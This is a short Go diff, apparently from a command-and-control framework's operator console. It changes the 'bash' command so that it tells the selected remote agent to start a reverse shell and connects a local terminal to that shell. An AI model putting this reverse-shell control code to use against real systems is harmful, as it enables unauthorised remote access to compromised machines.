@@ -188,7 +188,16 @@ shell:
 			continue shell
 
 		case input == "bash":
-			reverseBash()
+			// activate reverse shell in agent
+			err := SendCmd("bash", CurrentTarget)
+			if err != nil {
+				CliPrintError("Cannot activate reverse shell on remote target: ", err)
+				return
+			}
+			time.Sleep(1 * time.Second)
+			// launch local terminal to use remote bash shell
+			send := make(chan []byte)
+			reverseBash(agent.H2Stream.Ctx, send, RecvAgent)
 			time.Sleep(1 * time.Second)
 			break shell
 
